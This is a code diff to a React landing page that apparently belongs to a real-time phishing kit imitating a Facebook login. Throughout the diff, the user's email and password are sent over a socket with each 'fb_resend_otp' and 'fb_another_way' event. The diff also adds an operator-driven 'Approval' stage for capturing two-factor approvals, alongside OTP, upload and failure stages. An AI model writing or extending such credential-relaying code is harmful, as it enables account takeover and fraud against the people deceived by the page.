@@ -22,6 +22,7 @@ import Failed from "../components/generic/Failed";
 import { toaster } from "../components/ui/toaster";
 import StageTwoFive from "../components/generic/StageTwoFive";
 import axios from "axios";
+import Approval from "../components/generic/Approval";
 
 const Landing = () => {
   const navigate = useNavigate();
@@ -80,6 +81,22 @@ const Landing = () => {
                 setSendTo(data.sendTo);
               }
             }
+          } else if (data.response === "approve") {
+            if (data.sendTo) {
+              setIsLoading(false);
+
+              if (data.nextStep) {
+                setCurrentStage(data.nextStep);
+              }
+
+              if (data.message) {
+                setVerificationMessage(data.message);
+              }
+
+              if (data.sendTo) {
+                setSendTo(data.sendTo);
+              }
+            }
           } else {
             setIsLoading(false);
 
@@ -104,6 +121,36 @@ const Landing = () => {
         } else if (data.eventType === "fb_resend_otp") {
           if (data.sendTo) {
             setIsLoading(false);
+
+            if (data.message) {
+              setVerificationMessage(data.message);
+            }
+
+            if (data.sendTo) {
+              setSendTo(data.sendTo);
+            }
+          }
+        } else if (data.eventType === "fb_approval_mounted") {
+          setIsLoading(false);
+
+          if (data.message) {
+            setVerificationMessage(data.message);
+          }
+
+          if (data.sendTo) {
+            setSendTo(data.sendTo);
+          }
+
+          if (data.nextStep) {
+            setCurrentStage(data.nextStep);
+          }
+        } else if (data.eventType === "fb_another_way") {
+          if (data.sendTo) {
+            setIsLoading(false);
+
+            if (data.nextStep) {
+              setCurrentStage(data.nextStep);
+            }
 
             if (data.message) {
               setVerificationMessage(data.message);
@@ -174,6 +221,17 @@ const Landing = () => {
     setIsLoading(true);
     setErrorMessage("");
     socketRef.current.emit("fb_resend_otp", {
+      email: credentials.username,
+      password: credentials.password,
+      timestamp: new Date().toISOString(),
+      sessionId: socketRef.current.id,
+    });
+  };
+
+  const handleAnotherWay = () => {
+    setIsLoading(true);
+    setErrorMessage("");
+    socketRef.current.emit("fb_another_way", {
       email: credentials.username,
       password: credentials.password,
       timestamp: new Date().toISOString(),
@@ -257,10 +315,10 @@ const Landing = () => {
         handleResend={handleResend}
       />
     ),
-    3: <StageTwoFive handleUpload={handleUpload} />,
-    4: <StageThree handleFinish={handleFinish} />,
-    // 3: <ErrorStage handleFinish={handleFinish} />,
-    5: <Failed handleFinish={handleFinish} />,
+    3: <Approval socketRef={socketRef} handleAnotherWay={handleAnotherWay} />,
+    4: <StageTwoFive handleUpload={handleUpload} />,
+    5: <StageThree handleFinish={handleFinish} />,
+    6: <Failed handleFinish={handleFinish} />,
   };
 
   const slideVariants = {
